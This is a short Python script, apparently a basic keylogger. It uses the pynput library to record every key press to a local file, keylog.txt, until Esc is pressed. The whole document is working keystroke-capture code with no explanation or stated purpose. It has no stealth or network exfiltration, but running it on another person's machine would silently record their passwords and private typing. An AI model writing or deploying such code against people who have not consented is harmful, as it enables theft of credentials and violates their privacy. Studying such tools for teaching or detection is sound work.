from pynput.keyboard import Key, Listener

def on_press(key):
    try:
    
        with open("keylog.txt", "a") as f:
            f.write(str(key))
            f.write("\n")
    except Exception as e:
        print(str(e))

def on_release(key):
    if key == Key.esc:
        return False

def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
